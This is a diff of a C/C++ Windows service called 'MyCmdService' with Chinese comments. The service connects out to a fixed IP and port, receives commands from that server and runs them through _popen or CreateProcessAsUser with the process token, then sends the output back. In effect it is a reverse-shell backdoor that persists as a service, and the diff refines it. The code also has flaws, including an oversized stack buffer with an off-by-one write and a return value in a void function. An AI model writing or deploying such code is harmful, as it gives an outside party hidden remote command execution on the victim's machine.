@@ -1,4 +1,5 @@
 #include <stdio.h>
+#include <tchar.h>
 #include <winsock2.h>
 #include <windows.h>
 void cmd(char *command, SOCKET s);
@@ -8,6 +9,7 @@ void WINAPI ServiceCtrlHandler(DWORD controlCode);
 SERVICE_STATUS g_ServiceStatus = {0};
 SERVICE_STATUS_HANDLE g_StatusHandle = NULL;
 HANDLE g_ServiceStopEvent = INVALID_HANDLE_VALUE;
+SOCKET clientSocket;
 
 void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
 {
@@ -38,61 +40,86 @@ void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
 
     // 连接到服务器
     WSADATA wsaData;
-    WSAStartup(MAKEWORD(2, 2), &wsaData); // 初始化Winsock库
+    WSAStartup(MAKEWORD(2, 2), &wsaData);
 
-    SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0); // 创建套接字
+    SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
     if (clientSocket == INVALID_SOCKET)
     {
-        fprintf(stderr, "Error creating socket\n");
+        fprintf(stderr, "创建套接字时出错\n");
+        return 1;
     }
 
-    sockaddr_in serverAddr;
-    serverAddr.sin_family = AF_INET;                         // 地址族
-    serverAddr.sin_addr.s_addr = inet_addr("192.168.123.7"); // 服务器IP地址
-    serverAddr.sin_port = htons(8888);                       // 服务器端口号
-    int result;
-    if (connect(clientSocket, (sockaddr *)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
-    { // 连接到服务器
-        fprintf(stderr, "Error connecting to server\n");
+    struct sockaddr_in serverAddr;
+    serverAddr.sin_family = AF_INET;
+    serverAddr.sin_addr.s_addr = inet_addr("192.168.123.7");
+    serverAddr.sin_port = htons(8888);
+
+    if (connect(clientSocket, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
+    {
+        fprintf(stderr, "连接服务器时出错\n");
         closesocket(clientSocket);
-        Sleep(1000);                                    // 等待一段时间后重试
-        clientSocket = socket(AF_INET, SOCK_STREAM, 0); // 重新创建套接字
-        if (clientSocket == INVALID_SOCKET)
-        {
-            fprintf(stderr, "Error creating socket\n");
-        }
+        WSACleanup();
+        // 设置事件，通知服务已经停止
+        SetEvent(g_ServiceStopEvent);
+        return 1;
     }
     else
     {
-        // 连接成功，进行后续操作
-        char buffer[1024];
-        int bytesReceived;
         send(clientSocket, "run", 4, 0);
+    }
 
-        while (1)
+    // 假设你已经获取了用户的令牌并将其存储在hToken中
+    HANDLE hToken;
+
+    char buffer[1024000];
+    int bytesReceived;
+    while (1)
+    {
+        bytesReceived = recv(clientSocket, buffer, 1024000, 0);
+        if (bytesReceived > 0)
         {
-            bytesReceived = recv(clientSocket, buffer, 1024, 0); // 接收服务端的消息
-            if (bytesReceived > 0)
+            buffer[bytesReceived] = '\0';
+            if (OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken))
             {
-                buffer[bytesReceived] = '\0';
-                if (strcmp(buffer, "exit") == 0)
-                {
-                    break;
-                }
-                cmd(buffer, clientSocket);
-            }
-            else if (bytesReceived == 0)
-            {
-                printf("Server disconnected\n");
-                break;
+                executeCommandAsUser(clientSocket, hToken, buffer);
+                CloseHandle(hToken);
             }
             else
             {
-                fprintf(stderr, "Error receiving data\n");
-                break;
+                DWORD error = GetLastError();
+                printf("OpenProcessToken failed with error %d\n", error);
             }
         }
+        else if (bytesReceived == 0)
+        {
+            printf("服务器断开连接\n");
+            if (clientSocket != INVALID_SOCKET)
+            {
+                closesocket(clientSocket);
+            }
+            g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
+            SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
+            // 设置事件，通知服务已经停止
+            SetEvent(g_ServiceStopEvent);
+
+            break;
+        }
+        else
+        {
+            fprintf(stderr, "接收数据时出错\n");
+            if (clientSocket != INVALID_SOCKET)
+            {
+                closesocket(clientSocket);
+            }
+            // 设置事件，通知服务已经停止
+            g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
+            SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
+            SetEvent(g_ServiceStopEvent);
+            break;
+        }
     }
+
+    closesocket(clientSocket);
 
     g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
     SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
@@ -103,9 +130,10 @@ void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
     g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
     SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
 
-    WSACleanup(); // 清理Winsock库
-}
+    WSACleanup();
 
+    // 清理Winsock库
+}
 void WINAPI ServiceCtrlHandler(DWORD controlCode)
 {
     switch (controlCode)
@@ -116,51 +144,99 @@ void WINAPI ServiceCtrlHandler(DWORD controlCode)
 
         g_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
         SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
-        system("taskkill /IM cmd.exe /F");
+
+        // 添加关闭服务的代码
+        if (clientSocket != INVALID_SOCKET)
+        {
+            closesocket(clientSocket);
+        }
+        // 设置事件，通知服务已经停止
         SetEvent(g_ServiceStopEvent);
+
         break;
     }
 }
-
 void sendChunkedData(SOCKET s, const char *data, int length)
 {
     int totalSent = 0;
-    int bytesLeft = length;
-    int bytesSent;
-
     while (totalSent < length)
     {
-        bytesSent = send(s, data + totalSent, bytesLeft, 0);
+        int bytesSent = send(s, data + totalSent, length - totalSent, 0);
         if (bytesSent == SOCKET_ERROR)
         {
             fprintf(stderr, "Error sending data\n");
-            break;
+            return;
         }
         totalSent += bytesSent;
-        bytesLeft -= bytesSent;
     }
 }
 
-void cmd(char *command, SOCKET s)
+void executeCommandAsUser(SOCKET s, HANDLE hToken, const char *command)
 {
-    printf("%s is run\n", command);
 
-    FILE *fp = _popen(command, "r");
-    if (fp == NULL)
+    if (strstr(command, "dir") != NULL)
     {
-        fprintf(stderr, "Error executing command\n");
-        return;
-    }
+        FILE *fp;
+        char buffer[102400];
 
-    char buffer[4096];
-    size_t bytesRead;
-    while ((bytesRead = fread(buffer, 1, sizeof(buffer), fp)) > 0)
+        if ((fp = _popen(command, "r")) == NULL)
+        {
+            fprintf(stderr, "执行命令时出错\n");
+            return;
+        }
+
+        while (fgets(buffer, sizeof(buffer), fp) != NULL)
+        {
+            sendChunkedData(s, buffer, strlen(buffer));
+        }
+
+        _pclose(fp);
+    }
+    else
     {
-        sendChunkedData(s, buffer, bytesRead);
-        fwrite(buffer, 1, bytesRead, stdout);
-    }
+        HANDLE hReadPipe, hWritePipe;
+        SECURITY_ATTRIBUTES saAttr;
+        PROCESS_INFORMATION pi;
+        STARTUPINFO si;
+        DWORD bytesRead;
+        char buffer[102400];
 
-    _pclose(fp);
+        ZeroMemory(&saAttr, sizeof(SECURITY_ATTRIBUTES));
+        saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
+        saAttr.bInheritHandle = TRUE;
+        saAttr.lpSecurityDescriptor = NULL;
+
+        if (!CreatePipe(&hReadPipe, &hWritePipe, &saAttr, 0))
+        {
+            fprintf(stderr, "创建管道时出错\n");
+            return;
+        }
+
+        ZeroMemory(&si, sizeof(STARTUPINFO));
+        si.cb = sizeof(STARTUPINFO);
+        si.hStdError = hWritePipe;
+        si.hStdOutput = hWritePipe;
+        si.dwFlags |= STARTF_USESTDHANDLES;
+
+        if (!CreateProcessAsUser(hToken, NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
+        {
+            fprintf(stderr, "以用户身份创建进程时出错\n");
+            CloseHandle(hReadPipe);
+            CloseHandle(hWritePipe);
+            return;
+        }
+
+        CloseHandle(hWritePipe);
+
+        while (ReadFile(hReadPipe, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0)
+        {
+            sendChunkedData(s, buffer, bytesRead);
+        }
+
+        CloseHandle(hReadPipe);
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    }
 }
 
 int main()
@@ -180,28 +256,28 @@ int main()
         SERVICE_CHANGE_CONFIG); // need change config access
 
     ChangeServiceConfig(
-        schService,         // handle of service
-        SERVICE_NO_CHANGE,  // service type: no change
-        SERVICE_AUTO_START, // service start type
-        SERVICE_NO_CHANGE,  // error control type
-        NULL,               // binary path name
-        NULL,               // load order group
-        NULL,               // tag ID
-        NULL,               // dependencies
-        NULL,               // account name
-        NULL,               // password
-        NULL);              // display name
+        schService,           // handle of service
+        SERVICE_NO_CHANGE,    // service type: no change
+        SERVICE_DEMAND_START, // service start type, changed to manual start
+        SERVICE_NO_CHANGE,    // error control type
+        NULL,                 // binary path name
+        NULL,                 // load order group
+        NULL,                 // tag ID
+        NULL,                 // dependencies
+        NULL,                 // account name
+        NULL,                 // password
+        NULL);
 
     CloseServiceHandle(schService);
     CloseServiceHandle(schSCManager);
 
-    // 服务启动代码
-    LPCTSTR serviceName = TEXT("MyCmdService");
-    LPHANDLER_FUNCTION_EX serviceCtrlHandler = reinterpret_cast<LPHANDLER_FUNCTION_EX>(ServiceCtrlHandler);
+    SERVICE_TABLE_ENTRY serviceTable[2];
+    TCHAR serviceName[] = _T("MyCmdService");
 
-    SERVICE_TABLE_ENTRY serviceTable[] = {
-        {const_cast<LPTSTR>(serviceName), ServiceMain},
-        {NULL, NULL}};
+    serviceTable[0].lpServiceName = serviceName;
+    serviceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
+    serviceTable[1].lpServiceName = NULL;
+    serviceTable[1].lpServiceProc = NULL;
 
     if (!StartServiceCtrlDispatcher(serviceTable))
     {
